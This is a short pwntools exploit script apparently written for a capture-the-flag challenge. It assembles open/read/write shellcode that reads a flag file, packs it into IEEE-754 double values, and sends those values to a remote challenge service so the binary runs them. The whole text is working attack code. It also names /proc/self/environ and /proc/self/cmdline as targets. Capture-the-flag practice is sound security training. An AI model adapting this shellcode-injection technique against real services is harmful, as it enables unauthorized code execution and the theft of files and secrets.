from pwn import *

context.arch = 'amd64'

exe = ELF('./ieee')
#p = process(exe.path)
p = remote('dancer.chals.nitectf25.live', 1337, ssl=True)

PROC_ENVRION = '/proc/self/environ'
PROC_CMDLINE = '/proc/self/cmdline'

sc = shellcraft.open('./flag', 0)    
sc += shellcraft.read('rax', 'rsp', 0x40)  
sc += shellcraft.write(1, 'rsp', 0x40)     

shellcode_bytes = asm(sc)

# Pad shellcode to be multiple of 8 bytes
if len(shellcode_bytes) % 8 != 0:
    shellcode_bytes += b'\x90' * (8 - len(shellcode_bytes) % 8)

doubles = []
for i in range(0, len(shellcode_bytes), 8):
    chunk = shellcode_bytes[i:i+8]
    val = struct.unpack('<d', chunk)[0]  
    doubles.append(val)

for d in doubles:
    print(d)

p.recvuntil(b'enter the number of floats you want to enter!')
p.sendline(str(len(doubles)).encode())

pause()

for d in doubles:
    p.sendline(repr(d).encode())

p.interactive()

